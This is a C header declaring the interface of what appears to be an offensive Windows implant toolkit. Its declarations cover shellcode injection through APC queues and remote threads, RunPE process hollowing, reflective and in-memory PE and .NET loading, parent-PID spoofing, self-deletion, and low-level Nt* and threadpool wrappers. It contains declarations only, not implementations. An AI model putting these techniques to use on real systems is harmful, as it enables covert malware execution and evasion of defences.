#ifndef MALEFIC_WIN_KIT_H
#define MALEFIC_WIN_KIT_H

#include <stdbool.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

// 对应 Rust 中的 RawString
typedef struct RawString {
    uint8_t *data;     // 指向字符串缓冲区
    size_t len;        // 实际长度
    size_t capacity;   // 容量（一般与内部分配空间有关）
} RawString;

// 对应 Rust 中 pub struct MaleficPipe
typedef struct MaleficPipe {
    const void *read;
    const void *write;
} MaleficPipe;

// 对应 Rust 中 pub struct DarkModule
typedef struct DarkModule {
    const void *module_base;
} DarkModule;

// 函数定义

RawString ApcLoaderInline(
    const uint8_t *bin,
    size_t bin_len,
    bool need_output,
    uint32_t loader_type
);

RawString ApcLoaderSacriface(
    const uint8_t *bin,
    size_t bin_len,
    char *sacrifice_commandline,
    uint32_t ppid,
    bool block_dll,
    bool need_output
);

void DeleteSelf(
    const uint8_t * stream,
    uint32_t stream_len
);

RawString InjectRemoteThread(
    const uint8_t *bin,
    size_t bin_len,
    uint32_t pid
);

const void* MaleficLoadLibrary(
    uint32_t flags,
    const uint16_t *buffer,
    const void *file_buffer,
    size_t len,
    const uint8_t *name
);

const void* MaleficGetFuncAddrWithModuleBaseDefault(
    const void *module_base,
    const uint8_t *func_name,
    size_t func_name_len
);

RawString ReflectiveLoader(
    const uint8_t *start_commandline,
    size_t start_commandline_len,
    const uint8_t *reflective_loader_name,
    size_t reflective_loader_name_len,
    const uint8_t *data,
    size_t data_len,
    const uint8_t *param,
    size_t param_len,
    uint32_t ppid,
    bool block_dll,
    uint32_t timeout,
    bool is_need_output
);

RawString InlinePE(
    const uint8_t *bin,
    size_t bin_size,
    const uint16_t *magic,
    const uint32_t *signature,
    const uint8_t *commandline,
    size_t commandline_len,
    const uint8_t *entrypoint,
    size_t entrypoint_len,
    bool is_dll,
    bool is_need_output,
    uint32_t timeout,
    uint32_t delay
);

RawString RunPE(
    const uint8_t *start_commandline,
    size_t start_commandline_len,
    const uint8_t *hijack_commandline,
    size_t hijack_commandline_len,
    const uint8_t *data,
    size_t data_size,
    const uint8_t *entrypoint,
    size_t entrypoint_len,
    const uint8_t *args,
    size_t args_len,
    bool is_x86,
    uint32_t pid,
    bool block_dll,
    bool need_output
);

RawString RunSacrifice(
    uint8_t *application_name,
    const uint8_t *start_commandline,
    size_t start_commandline_len,
    const uint8_t *hijack_commandline,
    size_t hijack_commandline_len,
    uint32_t parent_id,
    bool need_output,
    bool block_dll
);

RawString MaleficExecAssembleInMemory(
    const uint8_t *data,
    size_t data_len,
    const uint8_t *const *args,
    size_t args_len
);

RawString MaleficBofLoader(
    const uint8_t *buffer,
    size_t buffer_len,
    const uint8_t *const *arguments,
    size_t arguments_size,
    const uint8_t *entrypoint_name
);

uint8_t HijackCommandLine(
    const uint8_t *commandline,
    size_t commandline_len
);

RawString MaleficPwshExecCommand(
    const uint8_t *command,
    size_t command_len
);

const void* PELoader(
    const void *handle,
    const void *base_addr,
    size_t size,
    bool need_modify_magic,
    bool need_modify_sign,
    uint16_t magic,
    uint32_t signature
);

void UnloadPE(const void *module);

// ============================================================
// Core Memory APIs
// ============================================================

void* MVirtualAlloc(void *ptr, size_t size, uint32_t flags, uint32_t protect);
void* MVirtualAllocEx(const void *handle, void *ptr, size_t size, uint32_t flags, uint32_t protect);
bool MVirtualProtect(void *ptr, size_t size, uint32_t new_protect, uint32_t *old_protect);
bool MVirtualProtectEx(const void *handle, void *ptr, size_t size, uint32_t new_protect, uint32_t *old_protect);
bool MWriteProcessMemory(const void *handle, void *ptr, const void *data, size_t len);
bool MReadProcessMemory(const void *handle, void *ptr, void *data, size_t len);
int32_t MNtAllocateVirtualMemory(const void *handle, void **ptr, size_t *size, uint32_t allocation_type, uint32_t protect);
int32_t MNtWriteVirtualMemory(const void *handle, void *ptr, const void *data, size_t len);
int32_t MNtProtectVirtualMemory(const void *handle, void **ptr, size_t *size, uint32_t new_protect, uint32_t *old_protect);
int32_t MNtCreateSection(void **section_handle, size_t *size, uint32_t protect, uint32_t flags);
int32_t MNtMapViewOfSection(void **section_handle, const void *handle, void **ptr, size_t *size, uint32_t flags, uint32_t protect);
void* MHeapAlloc(size_t size, uint32_t flags);
void MRtlFillMemory(void *Destination, size_t Length, uint8_t Fill);

// ============================================================
// Core Process APIs
// ============================================================

void* MOpenProcess(uint32_t dwDesiredAccess, int32_t bInheritHandle, uint32_t dwProcessId);
bool MCreateProcessA(
    const int8_t *lpApplicationName,
    int8_t *lpCommandLine,
    void *lpProcessAttributes,
    void *lpThreadAttributes,
    int32_t bInheritHandles,
    uint32_t dwCreationFlags,
    void *lpEnvironment,
    const int8_t *lpCurrentDirectory,
    void *lpStartupInfo,
    void *lpProcessInformation
);
void* MGetCurrentProcess(void);
uint32_t MGetCurrentProcessId(void);
void* MGetCurrentThread(void);
bool MTerminateProcess(void *hProcess, uint32_t uExitCode);

// ============================================================
// Core Thread APIs
// ============================================================

void* MCreateThread(
    void *lpThreadAttributes,
    uint32_t dwStackSize,
    void *lpStartAddress,
    void *lpParameter,
    uint32_t dwCreationFlags,
    uint32_t *lpThreadId
);
void* MCreateRemoteThread(
    void *hProcess,
    void *lpThreadAttributes,
    uint32_t dwStackSize,
    void *lpStartAddress,
    void *lpParameter,
    uint32_t dwCreationFlags,
    uint32_t *lpThreadId
);
int32_t MNtCreateThreadEx(
    void *thread_handle,
    uint32_t desired_access,
    void *object_attributes,
    void *process_handle,
    void *start_address,
    void *start_parameter,
    int32_t create_suspended,
    uint32_t stack_zero_bits,
    uint32_t size_of_stack_commit,
    uint32_t size_of_stack_reserve,
    void *attribute_list
);
void* MOpenThread(uint32_t dwDesiredAccess, int32_t bInheritHandle, uint32_t dwThreadId);
uint32_t MSuspendThread(void *hThread);
uint32_t MResumeThread(void *hThread);
void MExitThread(uint32_t dwExitCode);
bool MGetThreadContext(void *hThread, void *lpContext);
bool MSetThreadContext(void *hThread, void *lpContext);
uint32_t MWaitForSingleObject(void *hHandle, uint32_t dwMilliseconds);
uint32_t MQueueUserApc(void *pfnAPC, void *hThread, uint32_t dwData);
int32_t MNtQueueApcThreadEx(
    void *ThreadHandle,
    void *UserApcReserve,
    void *ApcRoutine,
    void *ApcArgument1,
    void *ApcArgument2,
    void *ApcArgument3
);
int32_t MNtTestAlert(void);
void* MCreateToolhelp32Snapshot(uint32_t dwFlags, uint32_t th32ProcessID);
bool MThread32First(void *hSnapshot, void *lpte);
bool MThread32Next(void *hSnapshot, void *lpte);

// ============================================================
// Core Foundation APIs
// ============================================================

void* MLoadLibraryA(const uint8_t *lpLibFileName);
void* MLoadLibraryW(const uint16_t *lpLibFileName);
int32_t MFreeLibrary(void *hLibModule);
void* MGetModuleHandleA(const uint8_t *lpmodulename);
const void* MGetProcAddress(const void *module, const uint8_t *proc_name);
void MCloseHandle(void *handle);
int32_t MNtClose(void *handle);

// ============================================================
// Callback APIs
// ============================================================

void* MGetDC(void *hWnd);
int32_t MEnumFontsA(void *hdc, const uint8_t *lpLogfont, void *lpProc, intptr_t lParam);
int32_t MEnumSystemLocalesA(void *lpLocaleEnumProc, uint32_t dwFlags);
int32_t MEnumWindows(void *lpEnumFunc, intptr_t lParam);

bool MaleficMakePipe(void **read, void **write);

const void* MaleficPipeRedirectStdOut(void *write);

void MaleficPipeRepairedStdOut(const void *stdout_handle);

const uint8_t* MaleficPipeRead(void *read_pipe);

void SafeFreePipeData(const uint8_t *data);

RawString CLRVersion(void);

bool MProcess32First(void *hSnapshot, void *lppe);
bool MProcess32Next(void *hSnapshot, void *lppe);
int32_t MNtContinue(void *ThreadContext, uint8_t RaiseAlert);
bool MGetNumaNodeProcessorMask(uint8_t Node, uint64_t *ProcessorMask);
int32_t MNtFlushInstructionCache(void *ProcessHandle, void *BaseAddress, uintptr_t NumberOfBytesToFlush);
int32_t MNtQueryInformationThread(void *ThreadHandle, uint32_t ThreadInformationClass, void *ThreadInformation, uint32_t ThreadInformationLength, uint32_t *ReturnLength);
void MRtlCaptureContext(void *ContextRecord);
void *MAddVectoredExceptionHandler(uint32_t First, void *Handler);
uint32_t MRemoveVectoredExceptionHandler(void *Handle);
void *MVirtualAllocExNuma(void *hProcess, void *lpAddress, uintptr_t dwSize, uint32_t flAllocationType, uint32_t flProtect, uint32_t nndPreferred);

// ============================================================
// Core Foundation APIs (Event)
// ============================================================

void* MCreateEventA(void *lpEventAttributes, int32_t bManualReset, int32_t bInitialState, const uint8_t *lpName);
bool MSetEvent(void *hEvent);
uint32_t MSleepEx(uint32_t dwMilliseconds, int32_t bAlertable);

// ============================================================
// Core FileSystem APIs
// ============================================================

void* MCreateFileW(uint16_t *lpFileName, uint32_t dwDesiredAccess, uint32_t dwShareMode, void *lpSecurityAttributes, uint32_t dwCreationDisposition, uint32_t dwFlagsAndAttributes, void *hTemplateFile);
bool MWriteFile(void *hFile, uint8_t *lpBuffer, uint32_t nNumberOfBytesToWrite, uint32_t *lpNumberOfBytesWritten, void *lpOverlapped);
int32_t MNtSetInformationFile(void *hFile, void *IoStatusBlock, void *FileInformation, uint32_t Length, uint32_t FileInformationClass);

// ============================================================
// Core Process APIs (Query / Threadpool)
// ============================================================

int32_t MNtQueryInformationProcess(void *ProcessHandle, uint32_t ProcessInformationClass, void *ProcessInformation, uint32_t ProcessInformationLength, uint32_t *ReturnLength);
void* MCreateThreadpoolWork(void *pfnwk, void *pv, void *pcbe);
void* MCreateThreadpoolIo(void *fl, void *pfnio, void *pv, void *pcbe);
void* MCreateThreadpoolTimer(void *pfnti, void *pv, void *pcbe);
void* MCreateThreadpoolWait(void *pfnwa, void *pv, void *pcbe);
int32_t MTpAllocAlpcCompletion(void *AlpcReturn, void *AlpcPort, void *Callback, void *Context, void *CallbackEnviron);
int32_t MTpAllocJobNotification(void *JobReturn, void *HJob, void *Callback, void *Context, void *CallbackEnviron);

#ifdef __cplusplus
}
#endif

#endif // MALEFIC_WIN_KIT_H